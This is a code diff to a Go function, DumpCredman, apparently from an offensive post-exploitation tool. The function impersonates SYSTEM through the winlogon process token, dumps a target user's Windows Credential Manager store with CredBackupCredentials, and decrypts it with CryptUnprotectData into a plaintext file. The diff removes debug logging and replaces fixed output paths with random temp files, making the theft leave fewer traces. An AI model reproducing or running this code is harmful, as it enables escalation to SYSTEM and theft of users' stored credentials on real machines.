@@ -3,7 +3,6 @@ package dumpcredman
 import (
 	"errors"
 	"fmt"
-	"log"
 	"os"
 	"strconv"
 	"syscall"
@@ -14,8 +13,20 @@ import (
 )
 
 func DumpCredman(userPid string) (string, error) {
-	outFileEncrypted := "C:\\Users\\Public\\tempdpapi__.txt"
-	outFileDecrypted := "C:\\Users\\Public\\tempDpapiDecryped.txt"
+	encryptedName, err := os.CreateTemp("", "*.txt")
+	if err != nil {
+		return "", err
+	}
+	outFileEncrypted := encryptedName.Name()
+	encryptedName.Close()
+	decryptedName, err := os.CreateTemp("", "*.txt")
+	if err != nil {
+		return "", err
+	}
+	outFileDecrypted := decryptedName.Name()
+	decryptedName.Close()
+	//outFileEncrypted := "C:\\Users\\Public\\temp__SDpapi__.txt"
+	//outFileDecrypted := "C:\\Users\\Public\\temp__DpapiDecryped.txt"
 	userPidInt, err := strconv.Atoi(userPid)
 	if err != nil {
 		return "", err
@@ -53,7 +64,6 @@ func DumpCredman(userPid string) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	log.Println("got past open winlogon process")
 	var hToken windows.Token
 	var duplicatedToken windows.Token
 	err = windows.OpenProcessToken(hProc, windows.TOKEN_DUPLICATE, &hToken)
@@ -61,7 +71,6 @@ func DumpCredman(userPid string) (string, error) {
 		windows.CloseHandle(windows.Handle(hProc))
 		return "", err
 	}
-	log.Println("got past open winlogon process token")
 	err = windows.DuplicateTokenEx(hToken, windows.TOKEN_ALL_ACCESS, nil, 2, windows.TokenPrimary, &duplicatedToken)
 	if err != nil {
 		windows.CloseHandle(windows.Handle(hToken))
@@ -76,7 +85,6 @@ func DumpCredman(userPid string) (string, error) {
 		windows.CloseHandle(windows.Handle(hProc))
 		return "", err
 	}
-	log.Println("got past lookup privilege")
 	luAttr := windows.LUIDAndAttributes{
 		Luid:       luid,
 		Attributes: windows.SE_PRIVILEGE_ENABLED,
@@ -95,8 +103,6 @@ func DumpCredman(userPid string) (string, error) {
 		windows.CloseHandle(windows.Handle(hProc))
 		return "", err
 	}
-	log.Println("got past adjust token")
-	// get user token
 	hUserProc, err := windows.OpenProcess(winapi.PROCESS_ALL_ACCESS, false, uint32(userPidInt))
 	if err != nil {
 		windows.CloseHandle(windows.Handle(hToken))
@@ -113,7 +119,6 @@ func DumpCredman(userPid string) (string, error) {
 		windows.CloseHandle(windows.Handle(hProc))
 		return "", err
 	}
-	log.Println("got past user token and process")
 	worked, err := winapi.ImpersonateLoggedOnUser(duplicatedToken)
 	if !worked {
 		windows.CloseHandle(windows.Handle(hUserToken))
@@ -122,8 +127,6 @@ func DumpCredman(userPid string) (string, error) {
 		windows.CloseHandle(windows.Handle(hProc))
 		return "", err
 	}
-	log.Println("got past impersonate system")
-	// im system now
 	err = winapi.CredBackupCredentials(windows.Handle(hUserToken), outFileEncrypted)
 	if err != nil {
 		windows.CloseHandle(windows.Handle(hUserToken))
@@ -133,7 +136,6 @@ func DumpCredman(userPid string) (string, error) {
 		windows.CloseHandle(windows.Handle(hProc))
 		return "", err
 	}
-	log.Println("got past backyp")
 	encryptedBlob, err := os.ReadFile(outFileEncrypted)
 	if err != nil {
 		os.Remove(outFileEncrypted)
@@ -158,12 +160,10 @@ func DumpCredman(userPid string) (string, error) {
 		windows.CloseHandle(windows.Handle(hProc))
 		return "", err
 	}
-	log.Println("got past crypt unprotect")
 	windows.RevertToSelf()
 	wrote := uint32(0)
 	hFile := winapi.CreateFile(outFileDecrypted, windows.GENERIC_WRITE, 0, 0, syscall.CREATE_ALWAYS, syscall.FILE_ATTRIBUTE_NORMAL, 0)
 	res := winapi.WriteFile(syscall.Handle(hFile), uintptr(unsafe.Pointer(verify.Data)), verify.Size, &wrote, 0)
-	log.Println("got past write")
 	if !res {
 		os.Remove(outFileEncrypted)
 		os.Remove(outFileDecrypted)
